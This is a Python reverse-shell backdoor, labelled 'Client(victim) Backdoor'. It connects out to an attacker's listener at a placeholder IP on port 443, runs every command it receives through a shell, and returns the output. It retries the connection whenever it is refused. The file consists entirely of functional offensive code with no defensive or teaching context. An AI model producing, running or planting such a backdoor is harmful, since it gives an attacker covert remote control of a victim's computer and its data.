#!/usr/bin/env python3
# -*- coding: cp850 -*

# Client(victim) Backdoor

import socket
import subprocess
import sys


def run_command(command):   #Function that execute command in the machine
    try:
        output_command = subprocess.check_output(command, stderr=subprocess.DEVNULL, shell=True)
        return output_command.decode('cp850')
    except subprocess.CalledProcessError:
        return f"[!] Command {command} not found"


def main(): # Main function
    try:
        host='<IP address of listener machine>'
        port= 443
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((host, port))
            s.sendall(b"\n[+] Connection established...\n\n")
            while True:
                command = s.recv(5120).decode().strip()
                if command == '!exit':
                    s.send(f"[!] Disconnecting...\n".encode())
                    break

                command_output = run_command(command)
                s.send(f"\n{command_output}\n".encode())
    except ConnectionRefusedError:
        main()
    except ConnectionAbortedError:
        pass
            
if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        sys.exit(1)
        
